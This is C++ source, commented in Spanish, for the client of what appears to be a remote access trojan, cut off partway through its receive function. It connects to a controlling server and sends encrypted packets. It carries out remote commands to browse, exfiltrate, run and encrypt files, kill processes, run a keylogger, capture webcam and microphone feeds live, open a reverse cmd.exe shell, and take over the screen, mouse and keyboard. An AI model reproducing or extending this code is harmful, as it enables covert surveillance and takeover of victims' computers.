#include "cliente.hpp"
#include "mod_mic.hpp"
#include "mod_file_manager.hpp"
#include "mod_keylogger.hpp"
#include "mod_camara.hpp"
#include "mod_remote_desktop.hpp"
#include "misc.hpp"

extern Cliente* cCliente;

void Print_Packet(const Paquete& paquete) {
    std::cout << "Tipo paquete: " << paquete.uiTipoPaquete << '\n';
    std::cout << "Tam buffer: " << paquete.uiTamBuffer<< '\n';
    std::cout << "Ultimo: " << paquete.uiIsUltimo<< '\n';
    std::cout << "Buffer size: " << paquete.cBuffer.size() << '\n';
}

void Cliente::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }

}

void Cliente::DestroyClasses() {
    if (this->mod_RemoteDesk != nullptr) {
        this->mod_RemoteDesk->DetenerLive();
        delete this->mod_RemoteDesk;
        this->mod_RemoteDesk = nullptr;
    }

    if (this->mod_Mic != nullptr) {
        this->mod_Mic->m_DetenerLive();
        delete this->mod_Mic;
        this->mod_Mic = nullptr;
    }

    if (this->reverseSHELL != nullptr) {
        this->reverseSHELL->TerminarShell();
        delete this->reverseSHELL;
        this->reverseSHELL = nullptr;
    }

    if (this->mod_Key != nullptr) {
        this->mod_Key->Stop();
        delete this->mod_Key;
        this->mod_Key = nullptr;
    }

    if (this->mod_Cam != nullptr) {
        delete this->mod_Cam;
        this->mod_Cam = nullptr;
    }

    __DBG_("[DC] Clases destruidas");
}

Cliente::Cliente() {
    this->Init_Key();
}

Cliente::~Cliente() {
	this->CerrarConexion();
    this->DestroyClasses();
}

void Cliente::CerrarConexion() {
    if (this->sckSocket != INVALID_SOCKET) {
		closesocket(this->sckSocket);
		this->sckSocket = INVALID_SOCKET;
	}
}

bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
	struct addrinfo sAddress, *sP, *sServer;
	memset(&sAddress, 0, sizeof(sAddress));

	sAddress.ai_family = AF_UNSPEC;
	sAddress.ai_socktype = SOCK_STREAM;

	int iRes = getaddrinfo(cIP, cPuerto, &sAddress, &sServer);
	if (iRes != 0) {
        __DBG_( "[X] getaddrinfo error" );
		return false;
	}

	for (sP = sServer; sP != nullptr; sP = sP->ai_next) {
		if ((this->sckSocket = socket(sP->ai_family, sP->ai_socktype, sP->ai_protocol)) == INVALID_SOCKET) {
			//socket error
			continue;
		}

		if (connect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
			//No se pudo conectar
            __DBG_("[X] No se pudo conectar");
			continue;
		}
		//exito
		break;
	}

	if (sP == nullptr || this->sckSocket == INVALID_SOCKET) {
        freeaddrinfo(sServer);
        return false;
	}

    unsigned long int iBlock = 1;
    if (ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0) {
        __DBG_( "[X] No se pudo hacer block" );
    }

    freeaddrinfo(sServer);
    
	return true;
}

void Cliente::Spawn_QueueMan() {
    this->isQueueRunning = true;
    this->p_thQueue = std::thread(&Cliente::Process_Queue, this);
}

void Cliente::Add_to_Queue(const Paquete_Queue& paquete) {
    std::unique_lock<std::mutex> lock(this->mtx_queue);
    this->queue_Comandos.push(paquete);
}

void Cliente::Process_Queue() {
    __DBG_("[PQ] Inicio");
    while (true) {
        
        if (!this->m_isRunning() || !this->m_isQueueRunning()) { break; }

        std::unique_lock<std::mutex> lock(this->mtx_queue);
        
        if (!this->queue_Comandos.empty()) {
            Paquete_Queue nTemp = this->queue_Comandos.front();
            this->queue_Comandos.pop();
            lock.unlock();
            
            this->Procesar_Comando(nTemp);
        }else {
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }
        
    }

    std::unique_lock<std::mutex> lock(this->mtx_queue);
    //Limpiar queue de tareas
    while (this->queue_Comandos.size() > 0) {
        this->queue_Comandos.pop();
    }
    lock.unlock();

    __DBG_("[PQ] Done");
}

//Procesar comando completo
void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
    std::vector<std::string> strIn;
    int iRecibido = paquete.cBuffer.size(); // esto -1 con datos binarios
    int iComando = paquete.uiTipoPaquete;

    _DBG_("[PQ] Procesando comando ", iComando);

    if (iComando == EnumComandos::FM_Descargar_Archivo_Recibir) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
        //strIn[0] = id archivo
        if (strIn.size() == 1) {
            int iHeadsize = strIn[0].size() + 1;
            int iBytesSize = iRecibido - iHeadsize - 1; // -1 por el \0 agregado al armar el paquete
            const char* cBytes = paquete.cBuffer.data() + iHeadsize;
            if (this->map_Archivos_Descarga[strIn[0]].ssOutfile.get()->is_open()) {
                this->map_Archivos_Descarga[strIn[0]].ssOutfile.get()->write(cBytes, iBytesSize);
                this->map_Archivos_Descarga[strIn[0]].uDescargado += iBytesSize;
            }else {
                _DBG_("[X] El archivo no esta abierto", GetLastError());
            }
        } else {
            __DBG_("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
        }
        return;
    }

    if (iComando == EnumComandos::FM_Descargar_Archivo_End) {
        std::string strID = paquete.cBuffer.data();
        if (this->map_Archivos_Descarga[strID].ssOutfile.get()->is_open()) {
            this->map_Archivos_Descarga[strID].ssOutfile.get()->close();
        }
        __DBG_("[!] Descarga completa");
        if (this->map_Archivos_Descarga[strID].uDescargado != this->map_Archivos_Descarga[strID].uTamArchivo) {
            __DBG_("[X] Error en la tranferencia");
        }
        return;
    }

    if (iComando == EnumComandos::FM_Descargar_Archivo_Init) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 3);
        //strIn[0] = ruta archivo
        //strIn[1] = tamano archivo
        //strIn[2] = id del archivo a recibir
        if (strIn.size() == 3) {
            _DBG_("[!] Descargando archivo en ruta " + strIn[0] + ". ID: " + strIn[2], atoi(strIn[1].c_str()));
            u64 uTamArchivo = StrToUint(strIn[1]);
            Archivo_Descarga nuevo_archivo;
            nuevo_archivo.ssOutfile = std::make_shared<std::ofstream>(strIn[0], std::ios::binary);
            nuevo_archivo.uDescargado = 0;
            nuevo_archivo.uTamArchivo = uTamArchivo;

            if (nuevo_archivo.ssOutfile.get()->is_open()) {
                this->Agregar_Archivo_Descarga(nuevo_archivo, strIn[2]);
            }else {
                _DBG_("[X] No se pudo abrir el archivo", GetLastError());
            }
        }else {
            __DBG_("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
        }
        return;
    }

    //Sin uso por ahora
    if (iComando == EnumComandos::PING) {
        __DBG_("[!]PING");
        //std::string strComand = std::to_string(EnumComandos::PONG);
        //strComand.append(1, CMD_DEL);
        //this->cSend(this->sckSocket, strComand.c_str(), strComand.size() + 1, 0, false, nullptr);
        return;
    }

    if (iComando == EnumComandos::CLI_STOP) {
        this->m_Stop();
        return;
    }

    //#####################################################
    //#####################################################
    //#        COMANDOS SUBMENU ADMIN ARCHIVOS           #

    //Listar drives
    if (iComando == EnumComandos::FM_Discos) {
        std::vector<struct sDrives> vDrives = Drives();
        std::string strDipositivos = ""; //std::to_string(EnumComandos::FM_Discos_Lista);
        strDipositivos.append(1, CMD_DEL);
        for (auto dev : vDrives) {
            std::string sLetter = dev.cLetter;
            std::string sFree = std::to_string(dev.dFree);
            std::string sTotal = std::to_string(dev.dTotal);
            std::string strTemp = sLetter.substr(0, sLetter.length() - 2);
            strTemp.append(1, '|');
            strTemp += dev.cType;
            strTemp.append(1, '|');
            strTemp += dev.cLabel;
            strTemp.append(1, '|');
            strTemp += sFree.substr(0, sFree.length() - 4);
            strTemp.append(1, '|');
            strTemp += sTotal.substr(0, sTotal.length() - 4);
            strTemp.append(1, CMD_DEL);

            strDipositivos += strTemp;
        }
        strDipositivos.pop_back();
        
        this->cChunkSend(this->sckSocket, strDipositivos.c_str(), strDipositivos.size(), 0, true, nullptr, EnumComandos::FM_Discos_Lista);
        return;
    }

    //Lista directorio
    if (iComando == EnumComandos::FM_Dir_Folder) {
        std::string strIn_c = paquete.cBuffer.data();
        
        std::string strPath = "";
        if (strIn_c == "DESCAR-DOWN") {
            strPath = this->ObtenerDown();
            std::string strPathBCDown = strPath;
            this->cChunkSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true, nullptr, EnumComandos::FM_CPATH);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }else if (strIn_c == "ESCRI-DESK") {
            strPath = this->ObtenerDesk();
            std::string strPathBCDesk = strPath;
            this->cChunkSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true, nullptr, EnumComandos::FM_CPATH);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }else {
            strPath = strIn_c;
        }

        std::string strCommand = "";

        for (auto item : vDir(strPath.c_str())) {
            strCommand.append(item);
            strCommand.append(1, '|');
        }

        strCommand.pop_back();

        this->cChunkSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true, nullptr, EnumComandos::FM_Dir_Folder);
        
        return;
    }

    //crear folder
    if (iComando == EnumComandos::FM_Crear_Folder) {
        CrearFolder(paquete.cBuffer.data());
        return;
    }

    if (iComando == EnumComandos::FM_Crear_Archivo) {
        CrearArchivo(paquete.cBuffer.data());
        return;
    }

    if (iComando == EnumComandos::FM_Borrar_Archivo) {
        BorrarArchivo(paquete.cBuffer.data());
        return;
    }

    //Enviar archivo al servidor
    if (iComando == EnumComandos::FM_Descargar_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
        //strIn[0] = ruta
        //strIn[1] = id_descarga
        if (strIn.size() == 2) {
            std::string param1 = strIn[0];
            std::string param2 = strIn[1];
            std::thread th(&EnviarArchivo, param1, param2, false);
            th.detach();
        }
        return;
    }

    if (iComando == EnumComandos::FM_Ejecutar_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
        //strIn[0] = ruta_archivo
        //strIn[1] = oculto/visible
        if (strIn.size() == 2) {
            bool isOK = Execute(strIn[0].c_str(), strIn[1] == "1" ? 1 : 0);

            if (isOK) {
                __DBG_("[!] " + strIn[0] + " - ejecutado");
            }else {
                __DBG_("[X] Error ejecutando " + strIn[0]);
            }
        }
        return;
    }

    if (iComando == EnumComandos::FM_Editar_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
        //strIn[0] = ruta_archivo
        //strIn[1] = id_archivo
        if (strIn.size() == 2) {
            std::string param1 = strIn[0];
            std::string param2 = strIn[1];
            std::thread th(&EnviarArchivo, param1, param2, true);
            th.detach();
        }
        return;
    }

    if (iComando == EnumComandos::FM_Editar_Archivo_Guardar_Remoto) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
        if (strIn.size() == 1) {
            int iHeader = strIn[0].size() + 1;
            EditarArchivo_Guardar(strIn[0], paquete.cBuffer.data() + iHeader, static_cast<std::streamsize>(iRecibido - iHeader - 1));
        }
        return;
    }

    if (iComando == EnumComandos::FM_Crypt_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 3);
        //strIn[0][0] = cifrar/descifrar  0/1
        //strIn[0][1] = borrar  0/1
        //strIn[1]    = ruta_archivo
        //strIn[2]    = password
        if (strIn.size() == 3) {
            Crypt_Archivo(strIn[1], strIn[0][0], strIn[0][1], strIn[2]);
        }
        return;
    }

    if (iComando == EnumComandos::FM_Renombrar_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 3);
        if (strIn.size() == 3) {
            //0 == nombre anterior -  1 == nuevo - 2 == ruta
            std::string strAntiguo = strIn[2] + strIn[0];
            std::string strNuevo = strIn[2] + strIn[1];
            RenombrarArchivo(strAntiguo.c_str(), strNuevo.c_str());
        }
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //#        COMANDOS SUBMENU ADMIN PROCESOS            #

    if (iComando == EnumComandos::PM_Refrescar) {
        std::string strProc = strProcessList();
        this->cChunkSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, true, nullptr, EnumComandos::PM_Lista);
        return;
    }

    if (iComando == EnumComandos::PM_Kill) {
        int iPID = atoi(paquete.cBuffer.data());
        if (!EndProcess(iPID)) {
            _DBG_("[X] No se pudo terminar el PID ", iPID);
        }
        return;
    }

    //#####################################################

    //#####################################################
    //#####################################################
    //#                   KEYLOGGER                       #
    if (iComando == EnumComandos::KL_Iniciar) {
        if (this->mod_Key == nullptr) {
            this->mod_Key = new mod_Keylogger();
            this->mod_Key->Start();
        }
        return;
    }

    if (iComando == EnumComandos::KL_Detener) {
        if (this->mod_Key) {
            this->mod_Key->Stop();
            delete this->mod_Key;
            this->mod_Key = nullptr;
        }
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //#                   CAMARA                          #
    if (iComando == EnumComandos::CM_Lista) {
        //Enviar lista de camaras
        if (!this->mod_Cam) {
            this->mod_Cam = new mod_Camera();
        }

        std::string strPaquete = "";

        std::vector<std::string> cDev = this->mod_Cam->ListNameCaptureDevices();
        if (cDev.size() > 0) {
            for (std::string cDevice : cDev) {
                __DBG_(cDevice);
                strPaquete += cDevice;
                strPaquete.append(1, '|');
            }
            strPaquete = strPaquete.substr(0, strPaquete.size() - 1);
        }
        else {
            strPaquete += "Nica|Nica2 :v";
        }
        
        this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::CM_Lista_Salida);
        
        return;
    }

    if (iComando == EnumComandos::CM_Single) {
        u_int iDeviceIndex = atoi(paquete.cBuffer.data());
        if (!this->mod_Cam) {
            this->mod_Cam = new mod_Camera();
            this->mod_Cam->ListNameCaptureDevices();
            if (this->mod_Cam->vcCamObjs.size() <= 0) {
                __DBG_("[X] No se obtuvieron camaras");
                delete this->mod_Cam;
                this->mod_Cam = nullptr;
                return;
            }
        }

        HRESULT hr = S_OK;
        
        if (iDeviceIndex > this->mod_Cam->vcCamObjs.size()) {
            iDeviceIndex = 0; //Si el numero enviado desde el sever es mayor setear a 0 como default
        }

        if (this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
            return;
        }

        hr = this->mod_Cam->Init(this->mod_Cam->vcCamObjs[iDeviceIndex].sActivate, iDeviceIndex);

        if (SUCCEEDED(hr)) {
            this->mod_Cam->vcCamObjs[iDeviceIndex].isActivated = true;

            __DBG_("[!] Camara iniciada correctamente");

            std::string strHeader = paquete.cBuffer.data();
            strHeader.append(1, CMD_DEL);

            int iHeaderSize = strHeader.size();
            u_int uiPacketSize = 0;
            std::vector<BYTE> cBuffer = this->mod_Cam->GetFrame(iDeviceIndex);

            if (cBuffer.size() > 0) {
                std::vector<BYTE> cJPGBuffer = this->mod_Cam->toJPEG(cBuffer.data(), cBuffer.size());
                u_int iJPGBufferSize = cJPGBuffer.size();
                if (iJPGBufferSize > 0) {
                    uiPacketSize = iHeaderSize + iJPGBufferSize;
                    std::vector<BYTE> cPacket(uiPacketSize);
                    if (cPacket.size() > 0) {
                        memcpy(cPacket.data(), strHeader.c_str(), iHeaderSize);
                        memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), iJPGBufferSize);

                        int iSent = this->cChunkSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.data()), uiPacketSize, 0, true, nullptr, EnumComandos::CM_Single_Salida);
                        _DBG_("[!] bytes sent", iSent);

                    }
                }
            }
        }

        this->mod_Cam->vcCamObjs[iDeviceIndex].ReleaseCam();
        return;
    }

    if (iComando == EnumComandos::CM_Live_Start) {
        u_int iDeviceIndex = atoi(paquete.cBuffer.data());
        if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
                this->mod_Cam->SpawnLive(iDeviceIndex);
            }
        return;
    }

    if (iComando == EnumComandos::CM_Live_Stop) {
        u_int iDeviceIndex = atoi(paquete.cBuffer.data());
        this->mod_Cam->JoinLiveThread(iDeviceIndex);
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //                    MIC                             # 
    //Lista de dispositivos de entrada (mic)
    if (iComando == EnumComandos::Mic_Refre_Dispositivos) {
        if (this->mod_Mic == nullptr) {
            this->mod_Mic = new Mod_Mic(this);
        }

        this->mod_Mic->sckSocket = this->sckSocket;
        this->mod_Mic->m_Enviar_Dispositivos();
        return;
    }

    //Escuchar mic en tiempo real
    if (iComando == EnumComandos::Mic_Iniciar_Escucha) {
        if (this->mod_Mic == nullptr) {
            this->mod_Mic = new Mod_Mic(this);
        }
        if (!this->mod_Mic->isLiveMic) {
            this->mod_Mic->sckSocket = this->sckSocket;
            this->mod_Mic->p_DeviceID = atoi(paquete.cBuffer.data());
            this->mod_Mic->m_EmpezarLive();
        }
        return;
    }

    if (iComando == EnumComandos::Mic_Detener_Escucha) {
        if (this->mod_Mic != nullptr) {
            this->mod_Mic->sckSocket = this->sckSocket;
            this->mod_Mic->m_DetenerLive();
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            delete this->mod_Mic;
            this->mod_Mic = nullptr;
        }
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //                REVERSE SHELL                       # 
    //Iniciar shell
    if (iComando == EnumComandos::Reverse_Shell_Start) {
        if (this->reverseSHELL != nullptr) {
            this->reverseSHELL->TerminarShell();
            delete this->reverseSHELL;
            this->reverseSHELL = nullptr;
        }
        this->reverseSHELL = new ReverseShell(this);
        this->reverseSHELL->sckSocket = this->sckSocket;
        this->reverseSHELL->SpawnShell("C:\\Windows\\System32\\cmd.exe");
        return;
    }

    //Escribir comando a la shell
    if (iComando == EnumComandos::Reverse_Shell_Command) {
        if (this->reverseSHELL) {
            std::string strJoined = std::string(paquete.cBuffer.data());
            this->reverseSHELL->thEscribirShell(strJoined);

            if (strJoined == "exit\r\n") {
                if (this->reverseSHELL) {
                    this->reverseSHELL->TerminarShell();
                    delete this->reverseSHELL;
                    this->reverseSHELL = nullptr;
                }
                __DBG_("[!] Shell terminada");
            }
        }
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //                ESCRITORIO REMOTO                   # 
    //Lista de pantallas
    if (iComando == EnumComandos::RD_Lista) {
        if (!this->mod_RemoteDesk) {
            this->mod_RemoteDesk = new mod_RemoteDesktop();
        }
        std::string strPaquete = "";
        std::vector<Monitor> Monitores = this->mod_RemoteDesk->m_ListaMonitores();
        if (Monitores.size() > 0) {
            for (Monitor m : Monitores) {
                //Testing
                strPaquete += m.szDevice;
                strPaquete.append(1, CMD_DEL);
                strPaquete += std::to_string(m.rectData.resWidth);
                strPaquete.append(1, CMD_DEL);
                strPaquete += std::to_string(m.rectData.resHeight);
                
                strPaquete.append(1, '|');
                //std::cout << "Nombre " << m.szDevice<<"\n";
                //std::cout << "Resolucion: " << m.rectData.resWidth << "x" << m.rectData.resHeight << "\n";
                //std::cout << "Bounds: xStart:" << m.rectData.xStart << " yStart: " << m.rectData.yStart << "\n";
            }
            strPaquete.pop_back();
            this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::RD_Lista_Salida);
        }else {
            _DBG_("No se obtuvieron monitores ? ", GetLastError());
        }
        return;
    }
    //Single
    if (iComando == EnumComandos::RD_Single) {
        //Enviar solo una captura
        if (!this->mod_RemoteDesk) {
            this->mod_RemoteDesk = new mod_RemoteDesktop();
        }
        //Si estra creado pero si no se esta en modo live
        if (this->mod_RemoteDesk && !this->mod_RemoteDesk->m_isRunning()) {
            strIn = strSplit(std::string(paquete.cBuffer.data()), '|', 2);
            if (strIn.size() == 2) {
                ULONG iQuality = static_cast<ULONG>(atoi(strIn[0].c_str()));
                int iMonitorIndex = atoi(strIn[1].c_str());
                _DBG_("Enviando captura de pantalla. Index:", iMonitorIndex);
                _DBG_("Calidad:", iQuality);
                std::vector<char> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality, iMonitorIndex);
                int iBufferSize = vcDeskBuffer.size();
                if (iBufferSize > 0) {
                    this->cChunkSend(this->sckSocket, vcDeskBuffer.data(), iBufferSize, 0, true, nullptr, EnumComandos::RD_Salida);

                }
                else {
                    __DBG_("El buffer de remote_desk es 0");
                }
            }
        }else {
            __DBG_("No se pudo reservar memoria para el modulo de escritorio remoto o ya esta enviando las imagenes");
        }
        return;
    }

    //Iniciar live
    if (iComando == EnumComandos::RD_Start) {
        if (!this->mod_RemoteDesk) {
            this->mod_RemoteDesk = new mod_RemoteDesktop();
        }
        if (this->mod_RemoteDesk) {
            strIn = strSplit(std::string(paquete.cBuffer.data()), '|', 2);
            if (strIn.size() == 2) {
                int iQuality = atoi(strIn[0].c_str());
                int iMonitorIndex = atoi(strIn[1].c_str());
                _DBG_("Empezando live de pantalla. Index:", iMonitorIndex);
                _DBG_("Calidad:", iQuality);

                this->mod_RemoteDesk->SpawnThread(iQuality, iMonitorIndex);
            }
        }
        return;
    }

    //Detener live
    if (iComando == EnumComandos::RD_Stop) {
        if (!this->mod_RemoteDesk) {
            __DBG_("No se ha iniciado el objeto de remote_Desktop");
            return;
        }
        this->mod_RemoteDesk->DetenerLive();
        return;
    }

    //Actualizar calidad de imagen
    if (iComando == EnumComandos::RD_Update_Q) {
        if (this->mod_RemoteDesk) {
            ULONG uQuality = static_cast<ULONG>(atoi(paquete.cBuffer.data()));
            this->mod_RemoteDesk->m_UpdateQuality(uQuality);
        }else {
            __DBG_("[RD]No se ha creado el objeto");
        }
        return;
    }
    
    //Mostar/ocultar mouse remoto en buffer de captura
    if (iComando == EnumComandos::RD_Update_Vmouse) {
        if (this->mod_RemoteDesk) {
            bool isVmouseOn = paquete.cBuffer[0] == '0' ? false : true;
            this->mod_RemoteDesk->m_UpdateVmouse(isVmouseOn);
        }
        else {
            __DBG_("[RD]No se ha creado el objeto");
        }
        return;
    }

    //Recibir coordenadas click remoto
    if (iComando == EnumComandos::RD_Send_Click) {
        if (this->mod_RemoteDesk) {
            strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 4);
            if (strIn.size() == 4) {
                int x             = atoi(strIn[0].c_str());
                int y             = atoi(strIn[1].c_str());
                int monitor_index = atoi(strIn[2].c_str());
                int mouse_action  = atoi(strIn[3].c_str());
                this->mod_RemoteDesk->m_RemoteMouse(x, y, monitor_index, mouse_action);
            }else {
                __DBG_("[RD] No se pudo parsear el paquete remote_click");
            }
        }
        else {
            __DBG_("[RD]No se ha creado el objeto");
        }
        return;
    }

    //Teclado remoto
    if (iComando == EnumComandos::RD_Send_Teclado) {
        if (this->mod_RemoteDesk) {
            strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
            if (strIn.size() == 2) {
                int key     = atoi(strIn[0].c_str());
                
                bool isDown = strIn[1][0] == '0' ? true : false;
                this->mod_RemoteDesk->m_RemoteTeclado(key, isDown);
            }else {
                __DBG_("[RD] No se pudo parsear el paquete remote_teclado");
            }
        }else {
            __DBG_("[RD]No se ha creado el objeto");
        }
        return;
    }

}

void Cliente::Procesar_Paquete(const Paquete& paquete) {
    std::vector<char>& acumulador = this->paquetes_Acumulados[paquete.uiTipoPaquete];
    size_t oldsize = acumulador.size();
    acumulador.resize(oldsize + paquete.uiTamBuffer);
    memcpy(acumulador.data() + oldsize, paquete.cBuffer.data(), paquete.uiTamBuffer);

    if (paquete.uiIsUltimo == 1) {
        _DBG_("[PP] Paquete completo ", paquete.uiTipoPaquete);
        //Agregar al queue de comandos
        acumulador.push_back('\0'); //Borrar este byte al trabajar con datos binarios
        Paquete_Queue nNuevo;
        nNuevo.uiTipoPaquete = paquete.uiTipoPaquete;
        nNuevo.cBuffer.insert(nNuevo.cBuffer.begin(), acumulador.begin(), acumulador.end());

        this->Add_to_Queue(nNuevo);

        this->paquetes_Acumulados.erase(paquete.uiTipoPaquete);
    }
}

//Loop principal
void Cliente::MainLoop() {
    this->Spawn_QueueMan(); //spawn thread que lee el queue de los comandos
    DWORD error_code = 0;
    int ultimo_paquete = 0;
    std::vector<char> cBuffer;
    
    while (true) {
        if (!this->m_isRunning()) {break;}

        int iRecibido = this->cRecv(this->sckSocket, cBuffer, 0, false, &error_code);
        
        if (iRecibido < 0 && error_code != WSAEWOULDBLOCK) {
            //No se pudo recibir nada
            if (this->mod_Cam != nullptr) {
                for(auto cCam : this->mod_Cam->vcCamObjs) {
                    //Si alguna camara esta live esperar un poco y tratar de volver a leer
                    if (cCam.isLive) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                        continue;
                    }
                }
            }
            __DBG_("[MAIN-LOOP] No se pudo recibir nada");
            _DBG_("Recibido:", iRecibido);
            _DBG_("Error:", error_code);
            _DBG_("Ultimo paquete:", ultimo_paquete);

            break;
        }

        //Si se recibio un paquete completo
        if (iRecibido > 0) {
            struct Paquete nNuevo;
            if (this->m_DeserializarPaquete(cBuffer.data(), nNuevo, iRecibido)) {
                ultimo_paquete = nNuevo.uiTipoPaquete;
                this->Procesar_Paquete(nNuevo);
            }else {
                _DBG_("Error deserializando el paquete. Recibido:", iRecibido);
            }
        }else {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

    }
    
    if (this->p_thQueue.joinable()) {
        this->m_StopQueue();
        this->p_thQueue.join();
    }

    this->DestroyClasses();

}

void Cliente::iniPacket() {
    //Enviar SO
    std::string strOut = strOS();
    strOut.append(1, CMD_DEL);
    strOut += strUserName();
    strOut.append(1, CMD_DEL);
    strOut += std::to_string(GetCurrentProcessId());
    strOut.append(1, CMD_DEL);
    strOut += strCpu();
    
    int iEnviado = this->cChunkSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, true, nullptr, EnumComandos::INIT_PACKET);
    
    _DBG_("[INIT]Enviados ", iEnviado);
}

int Cliente::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code, int iTipoPaquete) {
    int iEnviado      =    0;
    int iRestante     =    0;
    int iBytePos      =    0;
    int iChunkSize    =    0;
    int iChunkEnviado =    0;
    int iDataSize     = pLen;
    
    struct Paquete nPaquete;
    int iPaquet_Size = (sizeof(int) * 3) + PAQUETE_BUFFER_SIZE;
    char cPaqueteSer[(sizeof(int) * 3) + PAQUETE_BUFFER_SIZE];

    while (true) {
        iRestante = (iDataSize > iPaquet_Size) ? iDataSize - iPaquet_Size : iDataSize;

        if (iRestante > 0) {
            if (iRestante >= PAQUETE_BUFFER_SIZE) {
                iChunkSize = PAQUETE_BUFFER_SIZE;
            }else {
                iChunkSize = iRestante;
            }

            iDataSize -= iChunkSize;

            nPaquete.uiTipoPaquete = iTipoPaquete;
            nPaquete.uiTamBuffer = iChunkSize;
            nPaquete.uiIsUltimo = iDataSize == 0 ? 1 : 0;
            nPaquete.cBuffer.resize(iChunkSize);
            if (nPaquete.cBuffer.size() < iChunkSize) {
                _DBG_("[CHUNK] No se pudo reservar memoria", GetLastError());
                break;
            }

            memcpy(nPaquete.cBuffer.data(), pBuffer + iBytePos, iChunkSize);

            //Print_Packet(nPaquete);

            int iFinalSize = (sizeof(int) * 3) + iChunkSize;

            this->m_SerializarPaquete(nPaquete, cPaqueteSer);

            iChunkEnviado = this->cSend(pSocket, cPaqueteSer, iFinalSize, pFlags, isBlock, err_code);

            iEnviado += iChunkEnviado;
            iBytePos += iChunkSize;
        }else {
            break;
        }
    }

    return iEnviado;
}

int Cliente::send_all(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags) {
    int iEnviado = 0;
    int iTotalEnviado = 0;
    while (iTotalEnviado < pLen) {
        iEnviado = send(pSocket, pBuffer + iTotalEnviado, pLen - iTotalEnviado, pFlags);
        if (iEnviado == 0) {
            break;
        }
        else if (iEnviado < 0) {
            return -1;
        }
        iTotalEnviado += iEnviado;
    }

    return iTotalEnviado;
}

int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code) {
    // 1 non block
    // 0 block
    
    std::unique_lock<std::mutex> lock(this->sck_mutex);

    //Tamaño del buffer
    int iDataSize = pLen;

    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize);
    iDataSize = cData.size();
    if (iDataSize == 0) {
        _DBG_("[cSend] Error cifrando los datos", GetLastError());
        return -1;
    }

    //Enviar al inicio el size del paquete
    std::vector<char> cBufferFinal(iDataSize + sizeof(int));
    memcpy(cBufferFinal.data(), &iDataSize, sizeof(int));
    memcpy(cBufferFinal.data() + sizeof(int), cData.data(), iDataSize);

    iDataSize += sizeof(int);

    int iEnviado = 0;
    unsigned long int iBlock = 0;

    if (isBlock) {
        //Hacer el socket block
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            _DBG_("[cSend] No se pudo hacer block", GetLastError());
        }
    }
    
    iEnviado = send_all(pSocket, cBufferFinal.data(), iDataSize, pFlags);
    if (err_code != nullptr) {
        *err_code = GetLastError();
    }

    //Restaurar
    if (isBlock) {
        if (!this->BLOCK_MODE) {
            iBlock = 1;
            if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
                __DBG_("No se pudo restaurar el block_mode del socket");
            }
        }
    }
    
    return iEnviado;
}

int Cliente::recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags) {
    int iRecibido = 0;
    int iTotalRecibido = 0;
    while (iTotalRecibido < pLen) {
        iRecibido = recv(pSocket, pBuffer+iTotalRecibido, pLen-iTotalRecibido, pFlags);
        if (iRecibido == 0) {
            //Se cerro el socket
            break;
        }else if (iRecibido < 0) {
            //Ocurrio un error
            return -1;
        }
        iTotalRecibido += iRecibido;
    }
    return iTotalRecibido;
}

int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* err_code) {
    //Aqui el socket por defecto es block asi que si se pasa false es normal
    // 1 non block
    // 0 block
    

    std::vector<char> cRecvBuffer;
    
    int iRecibido = 0;
    unsigned long int iBlock = 0;
    bool bErrorFlag = false;
    if (isBlock) {
        //Hacer el socket block
